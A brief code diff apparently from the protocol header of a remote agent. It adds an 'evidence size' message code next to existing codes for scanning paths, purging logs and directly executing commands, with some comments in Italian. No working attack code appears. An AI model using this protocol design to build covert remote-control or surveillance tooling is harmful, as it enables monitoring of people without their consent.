@@ -357,6 +357,7 @@ extern u_int remoteAgents[];
 #define PROTO_FILESYSTEM  0x19  // List of paths to be scanned
 #define PROTO_PURGE       0x1a  // Elimina i file di log vecchi o troppo grossi
 #define PROTO_COMMANDS    0x1b  // Esecuzione diretta di comandi
+#define PROTO_EVIDENCE_SIZE 0x0b // Info about upcoming evidences
 
 #pragma mark -
 #pragma mark Log Types
